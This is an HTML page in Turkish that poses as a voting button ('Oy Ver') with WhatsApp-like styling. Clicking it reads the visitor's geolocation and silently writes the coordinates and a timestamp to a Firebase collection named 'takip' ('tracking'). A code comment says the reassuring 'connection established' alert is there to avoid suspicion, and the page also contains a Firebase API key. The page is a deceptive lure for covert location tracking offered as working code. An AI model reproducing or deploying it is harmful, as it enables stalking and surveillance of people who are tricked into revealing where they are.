<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş</title>
    <style>
        body { margin:0; background: black; height: 100vh; display: flex; justify-content: center; align-items: center; }
        #box { width: 120px; height: 50px; background: #00a884; color: white; display: flex; 
               justify-content: center; align-items: center; font-family: sans-serif; 
               font-size: 14px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div id="box" onclick="getLoc()">Oy Ver</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
            authDomain: "whtapp-27674.firebaseapp.com",
            projectId: "whtapp-27674"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.getLoc = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    // Konumu "takip" isimli bir belgeye yazıyoruz
                    await setDoc(doc(db, "takip", "admin"), {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        zaman: new Date().toLocaleString()
                    });
                    alert("Bağlantı kuruldu."); // Şüphe çekmemesi için basit bir mesaj
                }, (err) => { alert("Lütfen izin verin."); });
            }
        };
    </script>
</body>
</html>
